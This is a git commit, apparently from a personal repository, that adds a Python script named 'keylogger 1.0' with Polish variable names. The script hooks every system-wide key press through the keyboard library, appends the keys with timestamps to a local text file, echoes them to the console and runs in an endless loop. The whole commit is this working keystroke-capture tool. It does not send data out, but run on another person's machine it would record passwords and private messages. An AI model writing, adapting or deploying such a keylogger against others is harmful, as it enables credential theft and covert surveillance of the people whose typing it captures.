de0924e9f67c839a91bcec1d6cd61ec2edb5f532
xB0bon <pan.bobon@gmail.com>
2024-01-24 18:15:54 +0100

    keylogger 1.0

---
+++ keylogger/keylog.py
@@ -0,0 +1,37 @@
+# -*- coding: utf-8 -*-
+import keyboard
+import time
+
+nazwa_pliku = "test.txt"
+time_now = time.localtime()
+lokalnie = time.strftime("month: %d %B\nhour: %H:%M:%S\n", time_now)
+
+with open(nazwa_pliku, 'a') as plik:
+    plik.writelines("\n"+lokalnie+"\n")
+
+
+def on_key_pressed(e):
+    if e.name not in ["shift", "ctrl", "alt", "alt gr", "backspace"]:
+        print(f"Przycisk '{e.name}' został wciśnięty.")
+        with open(nazwa_pliku, 'a') as plik:
+
+            if e.name in ["down", "up", "left", "right", "caps lock"]:
+                plik.writelines(e.name + "\n")
+
+            elif e.name == "space":
+                plik.writelines(f" ({e.name}) ")
+
+            elif e.name == "enter":
+                plik.writelines(f" ({e.name}) \n")
+
+            elif e.name == "esc":
+                plik.writelines(f" ({e.name}) \n")
+
+            else:
+                plik.writelines(e.name)
+
+
+keyboard.on_press(on_key_pressed)
+
+while True:
+    pass
